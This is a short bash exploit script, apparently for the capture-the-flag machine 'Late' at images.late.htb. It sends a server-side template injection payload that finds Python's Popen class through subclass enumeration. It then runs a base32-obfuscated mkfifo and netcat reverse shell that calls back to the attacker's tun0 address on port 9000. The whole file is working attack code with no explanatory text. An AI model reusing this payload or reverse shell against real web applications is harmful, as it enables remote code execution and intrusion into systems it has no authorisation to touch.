#!/bin/bash
ip=$(ip a s tun0 | grep inet | head -n1 | awk '{print $2}' | cut -d/ -f1)
port=9000

index=$(curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__() }} '  http://images.late.htb/haxhaxhax | w3m -dump -T text/html  | tr -d '\n' | sed "s|'>, <|\n|g" | sed "s|'>,<class '|\nclass |g" | grep -in popen | head -n1 | cut -d : -f 1)
curl -Ssx 'http://localhost:8800' -d 'ssti={{dict.mro()[-1].__subclasses__()['$(($index-1))'](request.args.input,shell=True,stdout=-1).communicate()[0].strip()}} ' -d 'input=echo '$(echo 'rm /tmp/f1;mkfifo /tmp/f1;cat /tmp/f1|bash -i 2>&1|nc '$ip' '$port' >/tmp/f1' | base32 -w 0)' | base32 -d | bash' http://images.late.htb/haxhaxhax
